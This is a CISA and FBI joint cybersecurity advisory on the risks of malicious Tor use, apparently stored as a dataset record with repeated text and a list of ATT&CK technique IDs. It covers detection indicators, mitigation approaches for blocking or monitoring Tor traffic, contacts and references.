Sophisticated threat actors may leverage additional anonymization technologies—such as virtual private networks (VPNs)—and configurable features within Tor—such as Tor bridges and pluggable transports—to circumvent detection and blocking. Blocking the use of known Tor nodes may not effectively mitigate all hazards but may protect against less sophisticated actors. For example, blocking outbound traffic to known Tor entry nodes could have an appreciable impact in blocking less sophisticated malware from successfully beaconing out to hidden C2 machines obfuscated by Tor. Ultimately, each entity must consider its own internal thresholds and risk tolerance when determining a risk mitigation approach associated with Tor.

Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at central@cisa.dhs.gov.
Disclaimer
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/.

References

[1] CISA Alert: Continued Threat Actor Exploitation Post Pulse Secure VPN Patching. April 2020. Cyber threat actors used Connection Proxies—such as Tor and VPS—to minimize the chance of detection when connecting to victim VPN appliances.
[2] CISA Analysis Report: Enhanced Analysis of GRIZZLY STEPPE Activity. February 2017. GRIZZLY STEPPE actors have infected pirated software in torrent services and leveraged TOR exit nodes to deliver to malware since at least 2014.
[3] FBI Press Release: More Than 400 .Onion Addresses, Including Dozens of ‘Dark Market’ Sites, Targeted as Part of Global Enforcement Action on Tor Network. November 2014. Advertised goods and services included: computer-hacking tools and services.

Revisions

July 1, 2020: Initial Version|May 20, 2021: Corrected link in table 2|August 2, 2021: Corrected link in PDF






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1498', 'TA0010', 'T1499', 'T1253', 'T1190', 'T1188', 'T1094', 'TA0011', 'T1024', 'T1043', 'T1263', 'T1079', 'TA0015', 'TA0014', 'T1090', 'TA0001', 'T1071', 'TA0018', 'TA0040', 'T1250', 'T1486', 'T1254'}","




Summary

This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) and Pre-ATT&CK framework. See the ATT&CK for Enterprise and Pre-ATT&CK frameworks for referenced threat actor techniques.
This advisory—written by the Cybersecurity Security and Infrastructure Security Agency (CISA) with contributions from the Federal Bureau of Investigation (FBI)—highlights risks associated with Tor, along with technical details and recommendations for mitigation. Cyber threat actors can use Tor software and network infrastructure for anonymity and obfuscation purposes to clandestinely conduct malicious cyber operations.,1,2,3,
Tor (aka The Onion Router) is software that allows users to browse the web anonymously by encrypting and routing requests through multiple relay layers or nodes. This software is maintained by the Tor Project, a nonprofit organization that provides internet anonymity and anti-censorship tools. While Tor can be used to promote democracy and free, anonymous use of the internet, it also provides an avenue for malicious actors to conceal their activity because identity and point of origin cannot be determined for a Tor software user. Using the Onion Routing Protocol, Tor software obfuscates a user’s identity from anyone seeking to monitor online activity (e.g., nation states, surveillance organizations, information security tools). This is possible because the online activity of someone using Tor software appears to originate from the Internet Protocol (IP) address of a Tor exit node, as opposed to the IP address of the user’s computer.
CISA and the FBI recommend that organizations assess their individual risk of compromise via Tor and take appropriate mitigations to block or closely monitor inbound and outbound traffic from known Tor nodes.
Click here for a PDF version of this report.

Risk Evaluation

Malicious cyber actors use Tor to mask their identity when engaging in malicious cyber activity impacting the confidentiality, integrity, and availability of an organization’s information systems and data. Examples of this activity include performing reconnaissance, penetrating systems, exfiltrating and manipulating data, and taking services offline through denial-of-service attacks and delivery of ransomware payloads. Threat actors have relayed their command and control (C2) server communications—used to control systems infected with malware—through Tor, obscuring the identity (location and ownership) of those servers.
The use of Tor in this context allows threat actors to remain anonymous, making it difficult for network defenders and authorities to perform system recovery and respond to cyberattacks. Organizations that do not take steps to block or monitor Tor traffic are at heightened risk of being targeted and exploited by threat actors hiding their identity and intentions using Tor.
The risk of being the target of malicious activity routed through Tor is unique to each organization. An organization should determine its individual risk by assessing the likelihood that a threat actor will target its systems or data and the probability of the threat actor’s success given current mitigations and controls. This assessment should consider legitimate reasons that non-malicious users may prefer to, or need to, use Tor for accessing the network. Organizations should evaluate their mitigation decisions against threats to their organization from advanced persistent threats (APTs), moderately sophisticated attackers, and low-skilled individual hackers, all of whom have leveraged Tor to carry out reconnaissance and attacks in the past.

Technical Details

Tor obfuscates the source and destination of a web request. This allows users to conceal information about their activities on the web—such as their location and network usage—from the recipients of that traffic, as well as third parties who may conduct network surveillance or traffic analysis. Tor encrypts a user’s traffic and routes the traffic through at least three Tor nodes, or relays, so that the user’s starting IP address and request is masked from network and traffic observers during transit. Once the request reaches its intended destination, it exits Tor through a public Tor exit node. Anyone conducting monitoring or analysis will only see the traffic coming from the Tor exit node and will not be able to determine the original IP address of the request.
 

Figure 1: Malicious tactics and techniques aided by Tor, mapped to the MITRE ATT&CK framework
Malicious Tactics and Techniques Aided by Tor
Threat actors use Tor to create a layer of anonymity to conceal malicious activity at different stages of network compromise. Their tactics and techniques—illustrated in figure 1 above—include:
Pre-ATT&CK

Target Selection,
Technical Information Gathering,

Conduct Active Scanning,
Conduct Passive Scanning,
Determine domain and IP address space,
Identify security defensive capabilities,


Technical Weakness Identification,

ATT&CK

Initial Access,

Exploit Public-Facing Applications,


Command and Control,

Commonly Used Port,
Connection Proxy,
Custom Command and Control Protocol,
Custom Cryptographic Protocol,
Multi-hop Proxy,
Multilayer Encryption,
Standard Application Layer Protocol,


Exfiltration,
Impact,

Data Encrypted for Impact,
Endpoint Denial of Service,
Network Denial of Service,



Key Indicators of Malicious Activity via Tor
While Tor obfuscates a user from being identified through standard security tools, network defenders can leverage various network, endpoint, and security appliance logs to detect the use of Tor, including potentially malicious activity involving Tor, through indicator- or behavior-based analysis.
Using an indicator-based approach, network defenders can leverage security information and event management (SIEM) tools and other log analysis platforms to flag suspicious activities involving the IP addresses of Tor exit nodes. The list of Tor exit node IP addresses is actively maintained by the Tor Project’s Exit List Service, which offers both real-time query and bulk download interfaces (see https://blog.torproject.org/changes-tor-exit-list-service). Organizations preferring bulk download may consider automated data ingest solutions, given the highly dynamic nature of the Tor exit list, which is updated hourly. Network defenders should closely inspect evidence of substantial transactions with Tor exit nodes—revealed in netflow, packet capture (PCAP), and web server logs—to infer the context of the activity and to discern any malicious behavior that could represent reconnaissance, exploitation, C2, or data exfiltration.
Using a behavior-based approach, network defenders can uncover suspicious Tor activity by searching for the operational patterns of Tor client software and protocols. Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) ports commonly affiliated with Tor include 9001, 9030, 9040, 9050, 9051, and 9150. Highly structured Domain Name Service (DNS) queries for domain names ending with the suffix torproject.org is another behavior exhibited by hosts running Tor software. In addition, DNS queries for domains ending in .onion is a behavior exhibited by misconfigured Tor clients, which may be attempting to beacon to malicious Tor hidden services.
Organizations should research and enable the pre-existing Tor detection and mitigation capabilities within their existing endpoint and network security solutions, as these often employ effective detection logic. Solutions such as web application firewalls, router firewalls, and host/network intrusion detection systems may already provide some level of Tor detection capability.

Mitigations

Organizations can implement mitigations of varying complexity and restrictiveness to reduce the risk posed by threat actors who use Tor to carry out malicious activities. However, mitigation actions can also impact the access of legitimate users who leverage Tor to protect their privacy when visiting an organization’s internet-facing assets. Organizations should evaluate their probable risk, available resources, and impact to legitimate, non-malicious, Tor users before applying mitigation actions. 

Most restrictive approach: Block all web traffic to and from public Tor entry and exit nodes. Organizations that wish to take a conservative or less resource-intensive approach to reduce the risk posed by threat actors’ use of Tor should implement tools that restrict all traffic—malicious and legitimate—to and from Tor entry and exit nodes. Of note, blocking known Tor nodes does not completely eliminate the threat of malicious actors using Tor for anonymity, as additional Tor network access points, or bridges, are not all listed publicly. See table 1 for the most restrictive mitigation practices.


 

Less restrictive approach: Tailor monitoring, analysis, and blocking of web traffic to and from public Tor entry and exit nodes. There are instances in which legitimate users may leverage Tor for internet browsing and other non-malicious purposes. For example, deployed military or other overseas voters may use Tor as part of the voting process to escape monitoring by foreign governments. Such users may use Tor when visiting elections-related websites, to check voter registration status, or to mark and then cast absentee ballots via email or web portal. Similarly, some users may use Tor to avoid tracking by advertisers when browsing the internet. Organizations that do not wish to block legitimate traffic to/from Tor entry/exit nodes should consider adopting practices that allow for network monitoring and traffic analysis for traffic from those nodes, and then consider appropriate blocking. This approach can be resource intensive but will allow greater flexibility and adaptation of defensive.


 

Blended approach: Block all Tor traffic to some resources, allow and monitor for others. Given the various licit and illicit uses of Tor, a blended approach may be an appropriate risk mitigation strategy for some organizations (i.e., intentionally allowing traffic to/from Tor only for specific websites and services where legitimate use may be expected and blocking all Tor traffic to/from non-excepted processes/services). This may require continuous re-evaluation as an entity considers its own risk tolerance associated with different applications. The level of effort to implement this approach is high.

Considerations for Blocking Use of Tor
Sophisticated threat actors may leverage additional anonymization technologies—such as virtual private networks (VPNs)—and configurable features within Tor—such as Tor bridges and pluggable transports—to circumvent detection and blocking. Blocking the use of known Tor nodes may not effectively mitigate all hazards but may protect against less sophisticated actors. For example, blocking outbound traffic to known Tor entry nodes could have an appreciable impact in blocking less sophisticated malware from successfully beaconing out to hidden C2 machines obfuscated by Tor. Ultimately, each entity must consider its own internal thresholds and risk tolerance when determining a risk mitigation approach associated with Tor.

Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at central@cisa.dhs.gov.
Disclaimer
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/.

References,1, CISA Alert: Continued Threat Actor Exploitation Post Pulse Secure VPN Patching. April 2020. Cyber threat actors used Connection Proxies—such as Tor and VPS—to minimize the chance of detection when connecting to victim VPN appliances.,2, CISA Analysis Report: Enhanced Analysis of GRIZZLY STEPPE Activity. February 2017. GRIZZLY STEPPE actors have infected pirated software in torrent services and leveraged TOR exit nodes to deliver to malware since at least 2014.,3, FBI Press Release: More Than 400 .Onion Addresses, Including Dozens of ‘Dark Market’ Sites, Targeted as Part of Global Enforcement Action on Tor Network. November 2014. Advertised goods and services included: computer-hacking tools and services.

Revisions

July 1, 2020: Initial Version|May 20, 2021: Corrected link in table 2|August 2, 2021: Corrected link in PDF






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-183a
